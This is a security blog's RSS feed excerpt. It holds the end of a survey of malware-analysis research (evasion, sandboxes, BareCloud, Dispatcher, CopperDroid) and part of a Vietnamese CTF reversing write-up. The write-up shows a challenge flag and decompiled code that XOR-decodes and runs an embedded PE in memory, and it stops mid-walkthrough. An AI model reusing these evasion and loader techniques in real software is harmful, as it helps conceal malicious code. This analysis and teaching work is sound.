+<p><strong>Phylogenetic tree for malware</strong>: A phylogenetic tree is a branching diagram or "tree" showing the relationships among various biological species based upon similarities and differences in their genetic characteristics. The authors apply a binary tree by grouping similar nodes based on the previous similarity matrix until the matrix is empty.</p>
+<h3><a id="post-545-_Toc444553197"></a>Experimental validation</h3>
+<ul>
+<li>Malwares are captured through a honeypot called Nepenthes.</li>
+<li>They created some anti-RE binaries to include as a behavior should be observed.</li>
+<li>They created obfuscated assembler code, used a debugger to see the code changes its behavior or not.</li>
+<li>They handled sleep(), exception division by zero (which is often used as an anti-sandbox), observed virtual operating system environment.</li>
+</ul>
+<p>Using above sequences to compute the similarity, they generated a top 10 list of most common malware behavior, average similarity etc. and used AV software to explain the similarity. Then they applied phylogenetic tree to highlight 3 malware families then built 2 trees based on similarity matrix and Hellinger distance matrix.</p>
+<p>The authors introduced the automated malware behavior analysis, then they can detect 0day malware based on low average distance similarity from real world data. It is considered that malwares behave similarly at the beginning, it means the malware author copied parts from previous malware. They plan to extend the work with better heuristics and a differentiated analysis.</p>
+<h1><a id="post-545-_Toc444553198"></a>The malware analysis arms race and its consequences</h1>
+<h2><a id="post-545-_Toc444553199"></a>Malware evasive techniques</h2>
+<p><strong>Self-modifying code and packers [1]</strong>: The malware self modifies its binary and store data in memory using encoding or encryption techniques. It also can be polymorphic using different encryption keys. Countermeasures are RE the unpacking algorithm, generic detection and reconstruction of packed code (catching the original binary in process address space).</p>
+<p><strong>Detection of Analysis environment</strong>: Malware tries to detect analysis platforms based on: Hardware fingerprint, execution environment (eg. IsDebuggerPresent()), external applications (such as debuggers), behavioral. Mitigations are eliminating the differences between analysis environment and real environment or modifying the malware during execution to force the wanted path to be executed.</p>
+<p><strong>Logic bombs</strong>: A malware might only execute on a certain date or reliance on user input.</p>
+<p><strong>Analysis performance</strong>: The execution of malware analysis might slow down the timing in the operating system which executes malware. Countermeasures: RDTSC time-stam counter register, slowing down time in an emulated/virtual environment; terminate the analysis once a given timeout process.</p>
+<h2><a id="post-545-_Toc444553200"></a>Malware analysis tools</h2>
+<p>In order to deal with thousands of malwares with modern techniques, security analysts create many novel tools to ease these challenges.</p>
+<ul>
+<li>Anubis: analysis of unknown libraries based on TTAnalyze, executes the sample in a Windows OS, focus on the executed operations on behalf of the sample, and produce a report (now support Android APK as well).</li>
+<li>Multiple path exploration: This tool recognizes a branching point whenever a control flow decision is based on data outside the monitored process. Then it is detected if a control flow decision is based on a return value of a system call (e.g., the current system time). Multiple path exploration is a countermeasure of logic bombs.</li>
+<li>CWSandbox: a virtual environment based on invoking API functions by injecting DLL to the running process. Then it analyze malware behavior and produce a malware analysis report.</li>
+<li>Norman Sandbox: also used in [3] to reference to anti-emulation code. The Norman Sandbox provides a simulated environment with fake impression that it is running on a real system to the sample under analysis that consists of custom-made versions of user-land APIs necessary for the sample to execute.</li>
+</ul>
+<h2><a id="post-545-_Toc444553201"></a>Bare-metal Analysis-based Evasive Malware Detection</h2>
+<p>Nowadays, malwares become more and more sophisticated especially improved techniques to identify analysis environment and refraining from performing malicious actions. In this section, I introduce the research of BareCloud [5] - an automated evasive malware detection system based on bare-metal dynamic malware analysis. This is a novel approach of hierarchical similarity-based malware behavior comparison to analyze the behavior of a sample in the various analysis systems.</p>
+<h3><a id="post-545-_Toc444553202"></a>Bare-metal system overview</h3>
+<p>The bare-metal malware analysis system is a cluster of hardware-based modular worker units based on a remote storage disk. The bare-metal system also has a software-based remote control mechanism to automate the malware execution process on the workers. This mechanism is based on the IPMI remote administration features,iSCSI protocol (Internet Small Computer System Interface) to attach remote disks to worker units, Logical Volume Manager (LVM)-based copy-on-write snapshots to host the remote disk used by the analysis system running on the worker units. After the completion of each malware analysis, the corresponding volume snapshot is recreated from a clean volume.</p>
+<p>The bare-metal malware analysis system is a real hardware-based hence there is really difficult for malware to identify the analysis environment. With these network log and disk capture, the authors make a behavior comparison after applying behavior deviation, behavioral profile, behavior extraction and hierarchical similarity.</p>
+<h3><a id="post-545-_Toc444553203"></a>Evaluation</h3>
+<p>The experiments show that research produces better evasion detection results compared to previous methods. BareCloud was able to automatically detect 5,835 evasive malware out of 110,005 recent samples.</p>
+<h1><a id="post-545-_Toc444553204"></a>Automatic protocol RE</h1>
+<p>Previous sections focus on techniques to analyze and classify malware based on hooking functions, system calls. However, understanding the C&amp;C botnet’s protocol is a hard work and analysts need to rewrite every sent and received messages. In the next section, I will introduce Dispatcher [2] – an automatic protocol RE to analyze botnet networking communication.</p>
+<h2><a id="post-545-_Toc444553205"></a>Dispatcher implementation overview</h2>
+<p>The captured output buffer (in case of encrypted protocols, they capture the buffer before being encrypted and sent or they capture the buffer after being decrypted and received, therefore they can obtain unencrypted data) will be <em>deconstructed</em> to build message field tree.</p>
+<p><img class="aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-2.png?w=604&#038;ssl=1" data-recalc-dims="1" /> <img class="aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-3.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p style="text-align: center;">Fig 3. <em>Message field tree and Field semantics identified by Dispatcher</em></p>
+<p>To infer the field semantics, Juan Caballera et al. use type-inference-based technique that leverage the observation that many functions and instructions are used by known programs contain semantic information. Such interference is general and can be used to identify large scale of field semantics such as cookie, timestamps, hostname, port, IP address etc.</p>
+<p>Combining 2 above solutions, the authors introduced Dispatcher which firstly makes a forward pass over the execution trace collecting information needed using loop analysis, callstack analysis and buffer liveness analysis. Then it use a recursive process to deconstruct the buffer based on program locations, dependency chains (a sequence of write operations). Dispatcher infer the field attributes eventually by determine: keywords, length fields, delimiters, variable-length fields and arrays.</p>
+<h2><a id="post-545-_Toc444553206"></a>Evaluation</h2>
+<p>The authors evaluate these techniques on MegaD C&amp;C which uses a proprietary encryption protocol on port 443 (instead of SSL) and they successfully rewrite and summarize its field semantics and compare this with unencrypted messages using BinPac. Besides, they evaluate their techniques on 4 open protocols: HTTP, DNS, FTP and ICQ. The results show that the accuracy of the message format automatically extracted by Dispatcher can rival that of Wireshark, without requiring a manually generated grammar.</p>
+<h1><a id="post-545-_Toc444553207"></a>Automatically Reconstruct Android Malware Behaviors</h1>
+<p>With a huge user base of Anroid mobile devices, Android malwares are rising with an alarmingly pace. This section I will summarize basic concepts of CopperDroid [6], an approach built on top of QEMU to automatically perform out-of-the-box dynamic behavioral analysis of Android malware.</p>
+<h2><a id="post-545-_Toc444553208"></a>CooperDroid</h2>
+<p><img class="aligncenter" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-4.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p style="text-align: center;">Fig 4. <em>CooperDroid Architecture</em></p>
+<p>The whole Android system runs on top of the CopperDroid emulator based on qemu (a generic and open source machine emulator and virtualizer). It enhances the Android emulator to enable system call tracking and support our out-of-the-box system call-centric analyses. The communication between host and emulator is using GDB support.</p>
+<ul>
+<li>Tracking System Call Invocations: This is the basic dynamic malware analysis technique mentioned in 2.4. However, the ARM architecture underlying the Android operating system and CopperDroid <strong>swi </strong>instruction for invoking system calls which are different from Windows/Linux OS.</li>
+<li>Binder Analysis: Dissecting interprocess communication (IPC) and remote procedure calls (RPCs). Android uses Binder which allows a Java process to invoke methods of remote objects as if they were local methods, through synchronous calls. CopperDroid carry out a detailed analysis of communication channels to specify behaviours of malicious Android applications. For example, when sending a SMS message, the system invokes service <em>isms</em> and remotely invoking its <em>sendText</em> function with the proper arguments. CopperDroid catches the arguments of each binder-related ioctl system call to reconstruct the remote invocation.</li>
+<li>Path Coverage: Unanalysed path is exacerbated when mobile applications are user driven and interaction with applications. To address this problem, CopperDroid implements an approach based on extracting information from the Manifest to stimulate the analyzed sample with a number of events of interest. For example, injecting events such as phone calls and reception of SMS texts would lead to the execution of the registered application's broadcast receivers.</li>
+</ul>
+<h2><a id="post-545-_Toc444553209"></a>Results</h2>
+<p>The authors observed an average of 28% additional behaviors on more than 60% of the Android Malware Genome Project's samples, and an average of 22% additional behaviors on roughly 73% of the Contagio's samples.</p>
+<h1><a id="post-545-_Toc444553210"></a>References</h1>
+<p>[1] Egele, Manuel, et al. "A survey on automated dynamic malware-analysis techniques and tools." ACM Computing Surveys (CSUR) 44.2 (2012): 6.</p>
+<p>[2] Caballero, Juan, et al. "Dispatcher: Enabling active botnet infiltration using automatic protocol reverse-engineering." Proceedings of the 16th ACM conference on Computer and communications security. ACM, 2009.</p>
+<p>[3] Wagener, Gérard, Radu State, and Alexandre Dulaunoy. "Malware behaviour analysis." Journal in Computer Virology 4.4 (2008): 279-287.</p>
+<p>[4] Shahid Alam, R.Nigel Horspool, Issa Traore, Ibrahim Sogukpinar. “A framework for metamorphic malware analysis and real-time detection”. Computers &amp; security 48 (2015) 212-233</p>
+<p>[5] Dhilung Kirat, Giovanni Vigna, and Christopher Kruegel. “BareCloud: Bare-metal Analysis-based Evasive Malware Detection”. Proceedings of the 23rd USENIX Security Symposium. ISBN 978-1-931971-15-7</p>
+<p>[6] Alessandro Reina, Aristide Fattori, Lorenzo Cavallaro. “A System Call-Centric Analysis and Stimulation Technique to Automatically Reconstruct Android Malware Behaviors”. In the Proceedings of the 6th European Workshop on Systems Security (EuroSec).</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">545</post-id>	</item>
+		<item>
+		<title>[HackIM 2014] RE + Pwn MentalNote</title>
+		<link>https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/</link>
+				<pubDate>Tue, 13 Jan 2015 01:58:34 +0000</pubDate>
+		<dc:creator><![CDATA[Trí Chim Trích]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+		<category><![CDATA[re]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[list-linked]]></category>
+		<category><![CDATA[side-channel]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=259</guid>
+				<description><![CDATA[RE 100 - boo binary khá nặng C:\Users\chim\Desktop\nullcon\re\boo&#62;trid boo TrID/32 - File Identifier v2.10 - (C) 2003-11 By M.Pontello Collecting data from file: boo 100.0% (.) Mac OS X Mach-O 64bit Intel executable (4000/1) =&#62; Mac OS Binary kernel Mach 64 bit Check string 1 tí thì thấy UPX 3.91!. Ok thử decompress nào C:\Users\chim\Desktop\nullcon\re\boo&#62;upx -d &#8230; <a href="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/" class="more-link">Continue reading <span class="screen-reader-text">[HackIM 2014] RE + Pwn MentalNote</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<h2><span style="color: #3366ff;">RE 100 - boo</span></h2>
+<p>binary khá nặng</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;trid boo
+
+TrID/32 - File Identifier v2.10 - (C) 2003-11 By M.Pontello
+
+Collecting data from file: boo
+100.0% (.) Mac OS X Mach-O 64bit Intel executable (4000/1)</pre>
+<p>=&gt; Mac OS Binary kernel Mach 64 bit</p>
+<p>Check string 1 tí thì thấy UPX 3.91!. Ok thử decompress nào</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;upx -d boo
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2013
+UPX 3.91w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+upx: boo: NotPackedException: not packed by UPX
+
+Unpacked 0 files.</pre>
+<p>Failed!</p>
+<p>Check lại string lần nữa để ý thấy cái zlib.so, struct.so, python ME... nghi ngờ thể loại python-&gt;bin quá.</p>
+<p>Find header PYZ =&gt; founded :yolo:</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?ssl=1"><img data-attachment-id="262" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/boo_3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=608%2C72&amp;ssl=1" data-orig-size="608,72" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boo_3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=300%2C36&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=604%2C72&amp;ssl=1" class="alignnone size-full wp-image-262" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=604%2C72&#038;ssl=1" alt="boo_3" width="604" height="72" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?w=608&amp;ssl=1 608w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=300%2C36&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Ok easy roài, extract data python ra thôi - <a title="Link" href="http://reverseengineering.stackexchange.com/questions/160/how-do-you-reverse-engineer-an-exe-compiled-with-pyinstaller" target="_blank">Link</a></p>
+<pre class="lang:python decode:true ">import sys
+
+if len(sys.argv) == 13:
+	print "Great: flag{g3771ng_st4rt3d_2015}"
+else:
+	print "."</pre>
+<p>-------------------------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 200 - upx.exe</span></h2>
+<p>string thử chả thấy cái UPX! signature nào @@. decompress lại cho chắc failed nốt.</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?ssl=1"><img data-attachment-id="263" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=631%2C125&amp;ssl=1" data-orig-size="631,125" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=300%2C59&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=604%2C120&amp;ssl=1" class="alignnone size-full wp-image-263" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=604%2C120&#038;ssl=1" alt="upx_1" width="604" height="120" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?w=631&amp;ssl=1 631w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=300%2C59&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Run</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?ssl=1"><img data-attachment-id="264" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-orig-size="176,153" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" class="alignnone size-full wp-image-264" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?resize=176%2C153&#038;ssl=1" alt="upx_2" width="176" height="153" data-recalc-dims="1" /></a></p>
+<p><em>OK boy let's make it nicely!</em></p>
+<p>Bật IDA Disass thấy đây là 1 binary MS C++ bình thường.</p>
+<p>main là winMain -&gt; sau đó call hàm sub_4001000</p>
+<pre class="height-set:true lang:c decode:true">int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
+{
+    sub_401000();
+    return 0;
+}
+
+void *__cdecl sub_401000()
+{
+    void *result; // eax@1
+    void *MZ_header; // ecx@1
+    int v2; // ecx@4
+    int v3; // ebp@4
+    int v4; // esi@4
+    int v5; // ebx@4
+    const char *v6; // edi@5
+    unsigned int v7; // edi@9
+    int v8; // ebx@9
+    HANDLE v9; // eax@9
+    void *v10; // esi@9
+    unsigned int v11; // eax@10
+    HANDLE v12; // eax@12
+    int v13; // ebx@12
+    SIZE_T v14; // [sp+0h] [bp-28h]@1
+    int v15; // [sp+4h] [bp-24h]@14
+    int v16; // [sp+8h] [bp-20h]@14
+    int v17; // [sp+Ch] [bp-1Ch]@14
+    int v18; // [sp+10h] [bp-18h]@14
+    int v19; // [sp+14h] [bp-14h]@14
+    SIZE_T v20; // [sp+18h] [bp-10h]@14
+    int v21; // [sp+1Ch] [bp-Ch]@14
+    int v22; // [sp+20h] [bp-8h]@14
+    int v23; // [sp+24h] [bp-4h]@14
+
+    result = GetModuleHandleW(0);
+    MZ_header = result;
+    v14 = (SIZE_T)result;
+    if ( result )
+    {
+        result = (void *)'ZM';
+        if ( *(_WORD *)MZ_header == 'ZM' )
+        {
+            result = (char *)MZ_header + *((_DWORD *)MZ_header + 15);
+            if ( *(_DWORD *)result == 'EP' )
+            {
+                v2 = *((_WORD *)result + 10);
+                v3 = *((_WORD *)result + 3);
+                v4 = 0;
+                v5 = (int)((char *)result + v2 + 24);
+                if ( v3 &gt; 0 )
+                {
+                    v6 = (char *)result + v2 + 24;
+                    while ( 1 )
+                    {
+                        result = (void *)strcmp(v6, ".reloc");
+                        if ( !result )
+                            break;
+                        ++v4;
+                        v6 += 40;
+                        if ( v4 &gt;= v3 )
+                            return result;
+                    }
+                    v7 = *(_DWORD *)(v5 + 40 * v4 + 16);
+                    v8 = v5 + 40 * v4;
+                    v9 = GetProcessHeap();
+                    result = HeapAlloc(v9, 8u, v7 + 1);
+                    v10 = result;
+                    if ( result )
+                    {                                           // malloc, copy hex sang cho malloc 6600
+                        unknown_libname_41(result, v14 + *(_DWORD *)(v8 + 12), *(_DWORD *)(v8 + 16));
+                        v11 = 0;
+                        if ( v7 )
+                        {
+                            do
+                                *((_BYTE *)v10 + v11++) ^= 0x11u;
+                            while ( v11 &lt; v7 );
+                        }
+                        v14 = *(_DWORD *)v10;
+                        v12 = GetProcessHeap();
+                        result = HeapAlloc(v12, 8u, v14);
+                        v13 = (int)result;
+                        if ( result )
+                        {
+                            result = (void *)sub_406660((int)((char *)v10 + 4), (int)result, v7 - 4, (int)&amp;v14);
+                            if ( !result )
+                            {
+                                v18 = 0;
+                                v15 = 0;
+                                v16 = 0;
+                                v17 = 0;
+                                v21 = 0;
+                                v22 = 0;
+                                v23 = 0;
+                                v20 = v14;
+                                v19 = v13;
+                                LOBYTE(v18) = 1;
+                                sub_401B60((int)&amp;v15);
+                                ExitProcess(1u);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return result;
+}</pre>
+<p>đầu tiên nó gọi hàm getModuleHandle để tìm base address của MZ Header<br />
+sau đó check MZ signature và PE signature ::for sure::</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?ssl=1"><img data-attachment-id="265" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" data-orig-size="307,254" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=300%2C248&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" class="alignnone size-full wp-image-265" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=307%2C254&#038;ssl=1" alt="upx_3" width="307" height="254" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?w=307&amp;ssl=1 307w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=300%2C248&amp;ssl=1 300w" sizes="(max-width: 307px) 100vw, 307px" data-recalc-dims="1" /></a></p>
+<p>find session .alloc</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?ssl=1"><img data-attachment-id="266" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_4/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" data-orig-size="347,199" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_4" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=300%2C172&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" class="alignnone size-full wp-image-266" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=347%2C199&#038;ssl=1" alt="upx_4" width="347" height="199" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?w=347&amp;ssl=1 347w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=300%2C172&amp;ssl=1 300w" sizes="(max-width: 347px) 100vw, 347px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?ssl=1"><img data-attachment-id="268" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_6/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=609%2C35&amp;ssl=1" data-orig-size="609,35" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_6" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=300%2C17&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=604%2C35&amp;ssl=1" class="alignnone size-full wp-image-268" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=604%2C35&#038;ssl=1" alt="upx_6" width="604" height="35" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?w=609&amp;ssl=1 609w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=300%2C17&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">var A = heapalloc(0x6600)</pre>
+<p>đến đoạn unknown_libname_41 này vì mình rất ghét cái gì cứ dấu giếm, và 1 phần nhác trỗi dậy. function thông thường của mscrt thôi nên xem các tham số truyền vô và kết quả trả về để đoán vậy (memcpy)</p>
+<pre class="lang:default decode:true">memcpy(0x41b00, A, 0x6600)
+for i in range(0x6600):
+	A[i] ^= 0x11</pre>
+<p>*một đoạn memory khá dài, lại còn bị mã hóa nữa. không thể nào là flag cipher được? Có lẽ nào là shellcode?</p>
+<pre class="lang:default decode:true">new_size = *(dword*)A = 0xbe00
+var B = heapalloc(new_size)
+sub_406660( &amp;new_size ) =&gt; copy MZ_Header -&gt; đến B, size = 0xbe00</pre>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?ssl=1"><img data-attachment-id="267" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_5/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" data-orig-size="468,132" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_5" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=300%2C85&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" class="alignnone size-full wp-image-267" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=468%2C132&#038;ssl=1" alt="upx_5" width="468" height="132" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?w=468&amp;ssl=1 468w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=300%2C85&amp;ssl=1 300w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1" /></a></p>
+<p>Từ đây ta nhảy vào sub func cuối là sub_401b60</p>
+<p>Check các sub phụ, để ý các string mình thấy rất là liên quan</p>
+<pre class="lang:default decode:true">[+] Mapping PE file
+[+] Creating Map View of File
+[+] Map View of File created
+[+] Checking for self relocation
+[+] MyBase, MySize ?!?
+[+] Jumping to relocated image
+[+] Processing IAT
+[+] Loading Library and processing
+[+] Fixing Image Base address in PEB
+[+] Executing Entry Point !!!</pre>
+<p>và 1 số function khá vãi</p>
+<pre class="lang:default decode:true ">- CreateFileMappingW
+- MapViewOfFile
+- VirtualAlloc
+- GetProcAddress
+- VirtualQuery
+- LoadLibraryA
+- VirtualProtect</pre>
+<p>oke, tít đi ít! run shellcode chắc roài ::bem::</p>
+<p>ta đặt breakpoint ở ngay các sub con và run lần lượt đến khi nào shell được chạy thì phát hiện điểm G</p>
